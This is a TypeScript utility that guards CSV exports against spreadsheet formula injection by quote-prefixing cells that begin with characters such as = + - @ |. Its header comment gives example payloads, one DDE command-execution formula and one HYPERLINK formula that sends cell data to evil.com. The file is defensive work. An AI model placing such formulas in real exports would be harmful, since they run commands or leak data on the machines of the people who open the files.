/**
 * CSV Export Security - Formula Injection Prevention
 * 
 * SECURITY: Excel, Google Sheets, and other spreadsheet applications execute
 * cells that start with: = + - @ | as formulas/commands.
 * 
 * This can lead to:
 * - Remote code execution (=cmd|'/c calc')
 * - Data exfiltration (=HYPERLINK("http://evil.com?"&A1))
 * - DDE attacks
 * 
 * Prevention: Prefix dangerous leading characters with single quote.
 */

const DANGEROUS_CHARS = ['=', '+', '-', '@', '|', '\t', '\r'] as const

/**
 * Sanitize a cell value for CSV export to prevent formula injection.
 * 
 * @param value - Raw cell value from database or user input
 * @returns Sanitized value safe for CSV export
 * 
 * @example
 * sanitizeCsvCell("=SUM(A1:A10)")  // Returns: "'=SUM(A1:A10)"
 * sanitizeCsvCell("Normal text")   // Returns: "Normal text"
 * sanitizeCsvCell(null)            // Returns: ""
 */
export function sanitizeCsvCell(value: unknown): string {
  // Handle null/undefined
  if (value === null || value === undefined) {
    return ''
  }

  // Convert to string
  const str = String(value)

  // Empty string
  if (str.length === 0) {
    return ''
  }

  // Check if starts with dangerous character
  if (DANGEROUS_CHARS.includes(str[0] as any)) {
    // Prefix with single quote to treat as text
    // Also escape any existing quotes
    return `'${str.replace(/"/g, '""')}`
  }

  // Safe value - just escape quotes for CSV format
  return str.replace(/"/g, '""')
}

/**
 * Sanitize an entire row of CSV data.
 * 
 * @param row - Array of cell values
 * @returns Array of sanitized values
 */
export function sanitizeCsvRow(row: unknown[]): string[] {
  return row.map(sanitizeCsvCell)
}

/**
 * Convert rows to CSV string with formula injection prevention.
 * 
 * @param headers - Column headers
 * @param rows - Data rows
 * @returns CSV string ready for download
 */
export function rowsToCsv(headers: string[], rows: unknown[][]): string {
  const headerRow = sanitizeCsvRow(headers).map(h => `"${h}"`).join(',')
  const dataRows = rows.map(row => 
    sanitizeCsvRow(row).map(cell => `"${cell}"`).join(',')
  )
  
  return [headerRow, ...dataRows].join('\n')
}

